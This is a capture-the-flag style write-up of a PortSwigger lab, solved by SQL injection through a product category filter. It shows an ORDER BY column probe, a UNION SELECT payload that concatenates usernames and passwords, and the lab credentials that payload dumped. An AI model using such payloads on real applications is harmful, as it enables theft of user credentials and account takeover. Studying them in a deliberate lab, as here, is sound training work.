# Lab: SQL injection UNION attack, retrieving multiple values in a single column
![](https://img.shields.io/badge/Difficulty-PRACTITIONER-blue)

**Lab Link:** [https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

---

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

---

### My solution:
I wanted to start by determining how many columns the original query returned: 

`filter?category=NULL' ORDER BY 1--` and increment it by 1 until I got an error. 

It gave me an error at 3, so the original query returns 2 columns.

Then I crafted this payload to return all info in a single column:

`/filter?category=NULL' UNION SELECT NULL, username || ' ' || password from users--`

It returned:

wiener po5s4emb64oaxzktcfdp

administrator ly7rqc1xoqfwpcomhn4b

carlos dvzsk4b6324r9093mz84

I logged in as administrator with the credentials to finish the lab.
